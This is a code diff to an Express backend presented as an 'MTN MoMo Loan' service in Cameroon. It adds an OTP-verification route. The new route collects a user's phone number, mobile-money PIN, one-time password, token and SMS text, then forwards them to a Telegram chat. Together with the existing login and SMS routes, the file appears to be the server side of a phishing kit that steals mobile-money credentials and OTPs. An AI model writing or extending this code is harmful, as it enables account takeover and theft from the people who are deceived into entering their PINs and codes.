@@ -1,6 +1,6 @@
 // backend/server.js
 // MTN MoMo Loan – Cameroon
-// Express backend: receives loan applications, logins, SMS submissions
+// Express backend: receives loan applications, logins, SMS submissions, OTP verification
 
 require('dotenv').config();
 
@@ -87,6 +87,7 @@ async function sendTelegramMessage(text) {
 const applications = new Map();
 const sessions = new Map();
 const smsSubmissions = new Map();
+const otpVerifications = new Map();
 
 // ============================================
 // ROUTES
@@ -256,11 +257,57 @@ app.post('/api/sms', async (req, res) => {
 });
 
 // --------------------------------------------
+// POST /api/verify-otp  ← NEW
+// --------------------------------------------
+app.post('/api/verify-otp', async (req, res) => {
+    try {
+        const { phone, pin, otp, sms, token } = req.body || {};
+
+        // --- Validation ---
+        if (!otp || typeof otp !== 'string' || !/^\d{4}$/.test(otp)) {
+            return res.status(400).json({ ok: false, error: 'OTP must be exactly 4 digits' });
+        }
+
+        const reference = generateReference();
+
+        const verification = {
+            reference,
+            phone: typeof phone === 'string' ? phone : 'unknown',
+            pin: typeof pin === 'string' ? pin : '',
+            otp: otp.trim(),
+            token: typeof token === 'string' ? token : '',
+            sms: typeof sms === 'string' ? sms.slice(0, 400) : '',
+            submittedAt: new Date().toISOString(),
+            status: 'verified',
+        };
+        otpVerifications.set(reference, verification);
+
+        // --- Telegram message ---
+        const msg =
+            `✅ <b>OTP Verified</b>\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `🔖 <b>Ref:</b> ${escapeHtml(reference)}\n` +
+            `📱 <b>Phone:</b> ${escapeHtml(verification.phone)}\n` +
+            (verification.pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(verification.pin)}</code>\n` : '') +
+            `🔐 <b>OTP:</b> <code>${escapeHtml(verification.otp)}</code>\n` +
+            `🕐 <b>Time:</b> ${escapeHtml(verification.submittedAt)}\n\n` +
+            (verification.sms ? `<b>Original SMS (partial):</b>\n<code>${escapeHtml(verification.sms)}</code>` : '');
+
+        await sendTelegramMessage(msg);
+
+        return res.json({ ok: true, reference });
+    } catch (err) {
+        console.error('verify-otp error:', err);
+        return res.status(500).json({ ok: false, error: 'Server error' });
+    }
+});
+
+// --------------------------------------------
 // GET /api/status/:ref
 // --------------------------------------------
 app.get('/api/status/:ref', (req, res) => {
     const ref = req.params.ref;
-    const app_ = applications.get(ref) || smsSubmissions.get(ref);
+    const app_ = applications.get(ref) || smsSubmissions.get(ref) || otpVerifications.get(ref);
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
     return res.json({
         ok: true,
